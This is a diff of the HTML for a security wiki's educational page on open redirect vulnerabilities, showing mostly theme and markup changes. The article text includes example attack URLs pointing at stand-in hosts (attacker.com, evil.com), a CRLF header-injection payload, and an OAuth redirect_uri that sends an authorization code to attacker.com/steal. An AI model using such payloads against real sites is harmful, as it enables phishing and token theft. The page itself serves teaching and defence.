@@ -1,37 +1,54 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Open Redirect # Open Redirect is a web security vulnerability that occurs when an application accepts user-controlled input to determine the destination of a redirect without proper validation. Attackers exploit this by crafting malicious URLs that appear to originate from a trusted domain but redirect victims to attacker-controlled sites. This vulnerability is commonly leveraged for phishing campaigns, credential theft, malware distribution, OAuth token theft, and bypassing security controls like SSRF protections and URL whitelists.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Open Redirect" />
-<meta property="og:description" content="Open Redirect # Open Redirect is a web security vulnerability that occurs when an application accepts user-controlled input to determine the destination of a redirect without proper validation. Attackers exploit this by crafting malicious URLs that appear to originate from a trusted domain but redirect victims to attacker-controlled sites. This vulnerability is commonly leveraged for phishing campaigns, credential theft, malware distribution, OAuth token theft, and bypassing security controls like SSRF protections and URL whitelists." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Open Redirect | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Open Redirect# Open Redirect is a web security vulnerability that occurs when an application accepts user-controlled input to determine the destination of a redirect without proper validation. Attackers exploit this by crafting malicious URLs that appear to originate from a trusted domain but redirect victims to attacker-controlled sites. This vulnerability is commonly leveraged for phishing campaigns, credential theft, malware distribution, OAuth token theft, and bypassing security controls like SSRF protections and URL whitelists.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Open Redirect">
+	<meta property="og:description" content="Open Redirect# Open Redirect is a web security vulnerability that occurs when an application accepts user-controlled input to determine the destination of a redirect without proper validation. Attackers exploit this by crafting malicious URLs that appear to originate from a trusted domain but redirect victims to attacker-controlled sites. This vulnerability is commonly leveraged for phishing campaigns, credential theft, malware distribution, OAuth token theft, and bypassing security controls like SSRF protections and URL whitelists.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Open Redirect">
+	<meta itemprop="description" content="Open Redirect# Open Redirect is a web security vulnerability that occurs when an application accepts user-controlled input to determine the destination of a redirect without proper validation. Attackers exploit this by crafting malicious URLs that appear to originate from a trusted domain but redirect victims to attacker-controlled sites. This vulnerability is commonly leveraged for phishing campaigns, credential theft, malware distribution, OAuth token theft, and bypassing security controls like SSRF protections and URL whitelists.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="2213">
+
+<title>Open Redirect • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -39,11 +56,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -54,9 +75,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -71,8 +89,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -88,8 +106,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -175,8 +193,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -223,8 +241,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -978,8 +996,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1000,8 +1018,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1022,8 +1040,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1044,8 +1062,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1066,8 +1084,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1101,8 +1119,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1123,8 +1141,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1145,8 +1163,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1167,35 +1185,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1203,30 +1199,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Open Redirect</strong>
+  <h3>Open Redirect</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1304,20 +1301,11 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="open-redirect">
-  Open Redirect
-  <a class="anchor" href="#open-redirect">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="open-redirect">Open Redirect<a class="anchor" href="#open-redirect">#</a></h1>
 <p>Open Redirect is a web security vulnerability that occurs when an application accepts user-controlled input to determine the destination of a redirect without proper validation. Attackers exploit this by crafting malicious URLs that appear to originate from a trusted domain but redirect victims to attacker-controlled sites. This vulnerability is commonly leveraged for phishing campaigns, credential theft, malware distribution, OAuth token theft, and bypassing security controls like SSRF protections and URL whitelists.</p>
 <hr>
-<h2 id="types-of-open-redirect-vulnerabilities">
-  Types of Open Redirect Vulnerabilities
-  <a class="anchor" href="#types-of-open-redirect-vulnerabilities">#</a>
-</h2>
-<h3 id="1-server-side-redirects">
-  1. Server-Side Redirects
-  <a class="anchor" href="#1-server-side-redirects">#</a>
-</h3>
+<h2 id="types-of-open-redirect-vulnerabilities">Types of Open Redirect Vulnerabilities<a class="anchor" href="#types-of-open-redirect-vulnerabilities">#</a></h2>
+<h3 id="1-server-side-redirects">1. Server-Side Redirects<a class="anchor" href="#1-server-side-redirects">#</a></h3>
 <ul>
 <li>Application performs HTTP 3xx redirect based on user input</li>
 <li>Redirect happens at server level using HTTP headers (Location, Refresh)</li>
@@ -1325,14 +1313,10 @@ https://github.com/alex-shpak/hugo-book
 <li>Attacker controls destination via URL parameters or POST data</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-bank.com/login?redirect=https://attacker.com/phishing
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Server</span> <span style="color:#a6e22e">responds</span> <span style="color:#66d9ef">with</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-bank.com/login?redirect=https://attacker.com/phishing
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Server</span> <span style="color:#a6e22e">responds</span> <span style="color:#66d9ef">with</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Location</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com/phishing
-</span></span></span></code></pre></div><h3 id="2-client-side-redirects-javascript">
-  2. Client-Side Redirects (JavaScript)
-  <a class="anchor" href="#2-client-side-redirects-javascript">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Location</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//attacker.com/phishing</span></span></span></code></pre></div><h3 id="2-client-side-redirects-javascript">2. Client-Side Redirects (JavaScript)<a class="anchor" href="#2-client-side-redirects-javascript">#</a></h3>
 <ul>
 <li>Redirect executed in browser using JavaScript</li>
 <li>Uses <code>window.location</code>, <code>window.location.href</code>, <code>window.open()</code>, or <code>document.location</code></li>
@@ -1340,16 +1324,12 @@ https://github.com/alex-shpak/hugo-book
 <li>Often found in SPAs and client-side routing frameworks</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable code
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">redirect_url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>).<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;next&#39;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable code
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">redirect_url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>).<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;next&#39;</span>);
 </span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">redirect_url</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Attack URL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//app.example.com/dashboard?next=https://evil.com
-</span></span></span></code></pre></div><h3 id="3-meta-refresh-redirects">
-  3. Meta Refresh Redirects
-  <a class="anchor" href="#3-meta-refresh-redirects">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//app.example.com/dashboard?next=https://evil.com</span></span></span></code></pre></div><h3 id="3-meta-refresh-redirects">3. Meta Refresh Redirects<a class="anchor" href="#3-meta-refresh-redirects">#</a></h3>
 <ul>
 <li>HTML meta tag triggers automatic redirect after specified time</li>
 <li>Often used for &ldquo;page moved&rdquo; notifications</li>
@@ -1357,16 +1337,12 @@ https://github.com/alex-shpak/hugo-book
 <li>Can bypass some client-side protections</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Vulnerable</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">--&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Vulnerable</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">--&gt;</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0;url=USER_INPUT&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">Attack</span> <span style="color:#f92672">--&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/page?url=https://attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Results</span> <span style="color:#66d9ef">in</span><span style="color:#f92672">:</span> &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0;url=https://attacker.com&#34;</span>&gt;
-</span></span></code></pre></div><h3 id="4-header-injection-leading-to-redirect">
-  4. Header Injection Leading to Redirect
-  <a class="anchor" href="#4-header-injection-leading-to-redirect">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">Results</span> <span style="color:#66d9ef">in</span><span style="color:#f92672">:</span> &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0;url=https://attacker.com&#34;</span>&gt;</span></span></code></pre></div><h3 id="4-header-injection-leading-to-redirect">4. Header Injection Leading to Redirect<a class="anchor" href="#4-header-injection-leading-to-redirect">#</a></h3>
 <ul>
 <li>Application reflects user input in HTTP headers</li>
 <li>CRLF injection allows attacker to inject Location header</li>
@@ -1374,16 +1350,12 @@ https://github.com/alex-shpak/hugo-book
 <li>Bypasses standard redirect validation</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/page?lang=en%0D%0ALocation:%20https://attacker.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//site.com/page?lang=en%0D%0ALocation:%20https://attacker.com
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Injected</span> <span style="color:#a6e22e">header</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Location</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com
-</span></span></span></code></pre></div><h3 id="5-oauthsaml-redirect-manipulation">
-  5. OAuth/SAML Redirect Manipulation
-  <a class="anchor" href="#5-oauthsaml-redirect-manipulation">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Location</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//attacker.com</span></span></span></code></pre></div><h3 id="5-oauthsaml-redirect-manipulation">5. OAuth/SAML Redirect Manipulation<a class="anchor" href="#5-oauthsaml-redirect-manipulation">#</a></h3>
 <ul>
 <li>OAuth callback URLs accept attacker-controlled redirects</li>
 <li><code>redirect_uri</code> parameter manipulation in OAuth flows</li>
@@ -1391,18 +1363,14 @@ https://github.com/alex-shpak/hugo-book
 <li>Leads to authorization code/token theft</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">authorization</span> <span style="color:#a6e22e">request</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">OAuth</span> <span style="color:#a6e22e">authorization</span> <span style="color:#a6e22e">request</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//oauth-provider.com/authorize?
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#ae81ff">123</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">client_id</span><span style="color:#f92672">=</span><span style="color:#ae81ff">123</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">redirect_uri</span><span style="color:#f92672">=</span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com/steal
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">response_type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">code</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Authorization</span> <span style="color:#a6e22e">code</span> <span style="color:#a6e22e">sent</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">attacker</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//attacker.com/steal?code=AUTHORIZATION_CODE
-</span></span></span></code></pre></div><h3 id="6-domain-confusion-redirects">
-  6. Domain Confusion Redirects
-  <a class="anchor" href="#6-domain-confusion-redirects">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">//attacker.com/steal?code=AUTHORIZATION_CODE</span></span></span></code></pre></div><h3 id="6-domain-confusion-redirects">6. Domain Confusion Redirects<a class="anchor" href="#6-domain-confusion-redirects">#</a></h3>
 <ul>
 <li>Application validates domain but accepts variations</li>
 <li>Subdomain confusion, homograph attacks, or typosquatting</li>
@@ -1410,14 +1378,10 @@ https://github.com/alex-shpak/hugo-book
 <li>Appears legitimate to users and automated tools</li>
 </ul>
 <p><strong>Example:</strong></p>
